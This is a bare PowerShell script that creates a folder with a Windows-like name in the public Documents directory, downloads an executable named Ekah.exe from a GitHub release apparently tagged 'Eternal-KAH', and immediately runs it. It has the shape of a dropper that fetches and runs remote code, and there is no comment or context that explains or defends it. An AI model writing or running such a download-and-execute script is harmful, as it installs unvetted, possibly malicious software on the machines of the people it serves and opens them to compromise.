New-Item -Path ("C:\Users\Public\Documents\Win-kah64x") -Confirm -ItemType directory 
$url = "https://github.com/KAH842/Kah/releases/download/Eternal-KAH/Ekah.exe"
$outpath = "C:\Users\Public\Documents\Win-kah64x/Ekah.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $outpath)
Start-Process "C:\Users\Public\Documents\Win-kah64x\Ekah.exe"